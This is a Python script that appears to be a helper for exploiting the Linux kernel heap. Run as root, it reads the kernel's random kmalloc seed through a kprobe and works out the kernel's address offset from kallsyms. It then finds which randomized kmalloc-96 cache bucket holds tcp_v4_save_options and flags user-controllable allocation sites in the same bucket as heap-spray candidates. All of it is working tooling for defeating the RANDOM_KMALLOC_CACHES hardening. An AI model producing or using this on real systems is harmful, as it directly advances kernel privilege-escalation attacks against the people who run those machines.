#!/usr/bin/env python3
"""pick_spray.py - compute the RANDOM_KMALLOC_CACHES buckets for THIS boot and
list controllable-content kmalloc-96 call sites that share save_options' bucket.
Run as root on the guest."""
import re, struct, subprocess, sys

# 1. seed via kprobe
T = "/sys/kernel/debug/tracing"
subprocess.run(f"bash -c 'echo 0 > {T}/events/kprobes/enable 2>/dev/null; echo > {T}/kprobe_events; "
               f"echo p:seed __x64_sys_getpid seed=@random_kmalloc_seed:u64 >> {T}/kprobe_events; "
               f"echo 1 > {T}/events/kprobes/seed/enable; echo > {T}/trace'", shell=True)
subprocess.run("python3 -c 'import os;os.getpid()'", shell=True)
import time; time.sleep(0.3)
tr = open(f"{T}/trace").read()
m = re.search(r"seed=(\d+)", tr)
if not m:
    print("error: could not read random_kmalloc_seed (kprobe/tracefs unavailable)", file=sys.stderr)
    sys.exit(1)
seed = int(m.group(1))

# 2. kallsyms
ks = {}
for l in subprocess.run("cat /proc/kallsyms", shell=True, capture_output=True, text=True).stdout.splitlines():
    p = l.split()
    if len(p) >= 3:
        ks.setdefault(p[2], int(p[0], 16))
if "_text" not in ks or "tcp_v4_route_req" not in ks:
    print("error: /proc/kallsyms is restricted (need root, kptr_restrict=0)", file=sys.stderr)
    sys.exit(1)
text = ks["_text"]
slide = text - 0xffffffff81000000
M = (1 << 64) - 1
G = 0x61C8864680B583EB
def bucket(a):
    return (((a ^ seed) * G) & M) >> 60

save_site = ks["tcp_v4_route_req"] + 0x91   # inlined tcp_v4_save_options kmalloc
sb = bucket(save_site)
print("seed=%d slide=%#x" % (seed, slide))
print("save_options call_site %#x bucket=%d" % (save_site, sb))

# 3. the catalog (file vaddrs) - convert with this boot's slide
sites = []
try:
    catalog = open("/tmp/all_sites.txt")
except OSError:
    print("note: /tmp/all_sites.txt not found; only the built-in picker can run", file=sys.stderr)
    print("save_options bucket=%d (use a call-site catalog for auto-selection)" % sb)
    sys.exit(0)
with catalog:
    for line in catalog:
        p = line.split()
        if len(p) != 4:
            continue
        sites.append((p[0], int(p[1], 16), int(p[2], 16), p[3]))
print("catalog sites: %d" % len(sites))
matches = [(fn, off, e) for fn, off, ret, e in sites if bucket(ret + slide) == sb]
print("== bucket-%d sites (controllable-content candidates marked):" % sb)
CONTROLLABLE = [
    "event_trigger_write", "bitmap_parselist_user", "key_alloc", "user_preparse",
    "unix_create_addr", "ip_options_get", "action_create", "do_setlink",
    "watch_queue_set_filter", "io_register_restrictions", "memdup_sockptr",
    "anon_vma_name_alloc", "ip_set_mcast_msfilter", "tcf_em_validate",
    "edid_write", "compat_ip_set_mcast_msfilter", "create_hist_field",
    "parse_assignment", "asymmetric_lookup_restriction", "str_read",
]
for fn, off, e in sorted(matches):
    tag = ""
    for c in CONTROLLABLE:
        if c in fn:
            tag = "  <<<<< CANDIDATE"
            break
    print("  %-46s +0x%-6x via %-20s%s" % (fn, off, e, tag))
